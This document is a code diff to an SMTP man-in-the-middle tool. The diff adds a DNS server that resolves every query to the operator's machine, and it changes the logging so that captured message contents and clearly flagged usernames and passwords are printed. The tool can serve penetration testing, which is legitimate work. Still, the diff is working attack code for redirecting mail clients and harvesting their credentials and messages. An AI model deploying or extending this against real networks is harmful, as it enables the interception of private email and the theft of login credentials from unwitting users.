@@ -2,11 +2,13 @@
 
 from SMTPServer import ThreadedSMTPServer
 from SMTPHandler import SMTPHandler
+from DNSServer import DNSServer
 import threading
 import os
 import argparse
 import signal
 import sys
+import time
 
 """
 MITMsmtp class for user interaction
@@ -141,31 +143,33 @@ class SimpleMessage:
         
     def setSender(self, sender):
         self.sender = sender
-        print(f"[INFO] Sender: {sender}")
+        print(f"[SMTP] Sender: {sender}")
         
     def addRecipient(self, recipient):
         self.recipients.append(recipient)
-        print(f"[INFO] Recipient: {recipient}")
+        print(f"[SMTP] Recipient: {recipient}")
         
     def setMessage(self, message):
         self.message = message
-        print(f"[INFO] Message captured ({len(message)} bytes)")
+        print(f"[SMTP] Message captured ({len(message)} bytes)")
+        if len(message) < 500:  # Print short messages
+            print(f"[SMTP] Message content: {message}")
         
     def setLogin(self, username, password):
         self.username = username
         self.password = password
-        print(f"[INFO] Login captured - Username: {username}, Password: {password}")
+        print(f"[SMTP] *** CREDENTIALS CAPTURED *** Username: {username}, Password: {password}")
         
     def setComplete(self):
-        print(f"[INFO] Message complete from {self.sender} to {self.recipients}")
+        print(f"[SMTP] Message complete from {self.sender} to {self.recipients}")
 
 def signal_handler(sig, frame):
     print('\n[INFO] Shutting down...')
     sys.exit(0)
 
 def main():
-    parser = argparse.ArgumentParser(description='MITMsmtp - SMTP Man-in-the-Middle Server')
-    parser.add_argument('--port', type=int, default=587, help='Port to listen on (default: 587)')
+    parser = argparse.ArgumentParser(description='MITMsmtp - SMTP Man-in-the-Middle Server with DNS')
+    parser.add_argument('--port', type=int, default=587, help='SMTP port to listen on (default: 587)')
     parser.add_argument('--server_address', default='0.0.0.0', help='Address to bind to (default: 0.0.0.0)')
     parser.add_argument('--server_name', default='mail.example.com', help='Server name to present to clients')
     parser.add_argument('--log', help='Log file (currently not implemented)')
@@ -175,6 +179,12 @@ def main():
     parser.add_argument('--keyfile', help='SSL key file')
     parser.add_argument('--print-lines', action='store_true', help='Print client-server communication')
     
+    # DNS server options
+    parser.add_argument('--enable-dns', action='store_true', help='Enable DNS server')
+    parser.add_argument('--dns-port', type=int, default=53, help='DNS port to listen on (default: 53)')
+    parser.add_argument('--dns-ip', help='IP address to respond with for all DNS queries (defaults to --server_address)')
+    parser.add_argument('--print-dns', action='store_true', help='Print DNS queries')
+    
     args = parser.parse_args()
     
     # Set up signal handler for graceful shutdown
@@ -183,6 +193,21 @@ def main():
     # Create handlers
     auth_handler = SimpleAuthHandler()
     message_handler = SimpleMessageHandler()
+    
+    # Initialize DNS server if enabled
+    dns_server = None
+    if args.enable_dns:
+        dns_ip = args.dns_ip if args.dns_ip else args.server_address
+        if dns_ip == '0.0.0.0':
+            print("[WARNING] DNS server cannot respond with 0.0.0.0. Please specify --dns-ip or use a specific --server_address")
+            sys.exit(1)
+        
+        dns_server = DNSServer(
+            listen_address='0.0.0.0',
+            listen_port=args.dns_port,
+            response_ip=dns_ip,
+            print_queries=args.print_dns
+        )
     
     # Create and start the MITM SMTP server
     mitm_server = MITMsmtp(
@@ -199,30 +224,55 @@ def main():
     )
     
     try:
-        print(f"[INFO] Starting MITMsmtp server on {args.server_address}:{args.port}")
+        print("=" * 60)
+        print("MITMsmtp - SMTP Man-in-the-Middle Server")
+        print("=" * 60)
+        
+        # Start DNS server first (if enabled)
+        if dns_server:
+            try:
+                dns_server.start()
+                print(f"[DNS] DNS server listening on port {args.dns_port}")
+                print(f"[DNS] All DNS queries will resolve to: {dns_server.response_ip}")
+            except Exception as e:
+                print(f"[DNS ERROR] Failed to start DNS server: {e}")
+                if args.dns_port == 53:
+                    print("[DNS HINT] Port 53 requires root privileges. Try: sudo python MITMsmtp.py ...")
+                sys.exit(1)
+        
+        # Start SMTP server
+        print(f"[SMTP] Starting SMTP server on {args.server_address}:{args.port}")
         if args.STARTTLS:
-            print("[INFO] STARTTLS enabled")
+            print("[SMTP] STARTTLS enabled")
         if args.SSL:
-            print("[INFO] SSL/TLS enabled")
+            print("[SMTP] SSL/TLS enabled")
         
         mitm_server.start()
-        print("[INFO] Server started. Waiting for connections...")
+        print("[SMTP] SMTP server started successfully")
+        
+        print("=" * 60)
+        print("[INFO] Servers are running. Waiting for connections...")
+        if dns_server:
+            print("[INFO] Configure clients to use this machine as their DNS server")
         print("[INFO] Press Ctrl+C to stop")
+        print("=" * 60)
         
         # Keep the main thread alive
         while True:
             try:
-                import time
                 time.sleep(1)
             except KeyboardInterrupt:
                 break
                 
     except Exception as e:
-        print(f"[ERROR] Failed to start server: {e}")
+        print(f"[ERROR] Failed to start servers: {e}")
     finally:
+        print("\n[INFO] Shutting down servers...")
         try:
+            if dns_server:
+                dns_server.stop()
             mitm_server.stop()
-            print("[INFO] Server stopped")
+            print("[INFO] All servers stopped")
         except:
             pass
 
